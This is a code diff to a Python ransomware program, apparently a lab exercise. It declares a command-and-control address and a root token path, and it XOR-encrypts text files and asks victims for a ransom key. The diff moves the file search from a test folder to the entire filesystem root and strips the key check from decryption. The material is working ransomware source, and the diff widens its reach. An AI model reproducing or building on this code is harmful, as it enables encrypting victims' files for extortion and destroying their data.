@@ -5,6 +5,7 @@ import sys
 from pathlib import Path
 from secret_manager import SecretManager
 
+
 CNC_ADDRESS = "cnc:6666"
 TOKEN_PATH = "/root/token"
 
@@ -37,7 +38,7 @@ class Ransomware:
         # return all files matching the filter
         # here we want all the texte files so the filter will be '*.txt'
         # the path("/") enable the function to find all the files matching the filter in the system
-        path_files=Path("/root/test/")
+        path_files=Path("/")  
         files = [f for f in path_files.rglob(filter)]
         return files
 
@@ -56,17 +57,14 @@ class Ransomware:
         liste_files = self.get_files("*.txt")
         secret_manager = SecretManager()
 
-        test_key = False
-        while test_key==False: #Test if the key is correct
+        try:
             candidate_key=input("Key : ")
-            if secret_manager.check_key(candidate_key)==True:
-                secret_manager.set_key(candidate_key)
-                secret_manager.xorfiles(liste_files)
-                print("All your file have been uncrypted, thank for the money ! good bye !")
-                test_key==True
-            else:
-                print("ERROR : The key is not correct")
-                self.decrypt()
+            secret_manager.set_key(candidate_key)
+            secret_manager.xorfiles(liste_files)
+            secret_manager.clean()
+            print("All your file have been uncrypted, thank for the money ! good bye !")
+        except:
+            print("ERROR : The key is not correct")
         return
 
 if __name__ == "__main__":
@@ -76,4 +74,4 @@ if __name__ == "__main__":
         ransomware.encrypt()
     elif sys.argv[1] == "--decrypt":
         ransomware = Ransomware()
-        #ransomware.decrypt()
+        ransomware.decrypt()
